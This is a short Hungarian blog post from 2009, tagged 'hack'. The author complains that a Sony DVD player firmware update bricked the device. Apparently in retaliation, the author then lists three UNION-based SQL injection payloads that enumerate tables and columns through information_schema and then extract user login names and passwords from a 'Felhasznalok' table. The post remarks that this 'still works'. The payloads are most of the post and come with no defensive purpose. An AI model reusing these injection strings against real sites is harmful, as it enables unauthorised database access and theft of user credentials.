---
title: "Firmware upgrade"
date: "2009-01-04"
tags: 
  - "hack"
---

Sony a seggem. Az asztali DVD lejátszóm ugyebár tud DivX-et lejátszani, de nem mennek vele a feliratok. Gondoltam jól van, nézzük van-e firmware frissítés a Sonynál. Hát [volt](http://support.sony-europe.com/HAV/downloads/downloads.aspx?m=RDR-HX722&f=fwr3&chck=&l=en) is, pont a feliratokhoz. Betűről betűre végigtoltam, és a végén most nem indul el az aparát. Mehetek szervízbe vele. Remek.

Ezen viszont kurvára felbasztam az agyamat... tehát.

_táblákok nevei:_

```
42 UNION SELECT 1,table_schema,3,4,5,6,7,table_name,9,10,11,12 FROM
          information_schema.TABLES
```

_oszlopok nevei:_

```
-- CONCAT('0x',HEX('Felhasznalok')) = 0x46656C6861737A6E616C6F6B

42 UNION SELECT 1,2,3,4,5,6,7,COLUMN_NAME,9,10,11,12 FROM
          information_schema.COLUMNS WHERE
                table_name = 0x46656C6861737A6E616C6F6B
```

_felhasználók nevei :))_

```
42 UNION SELECT 1,jelszo,3,4,5,6,7,loginNev,9,10,11,12 FROM
          Felhasznalok
```

Ez azért még megy. :)
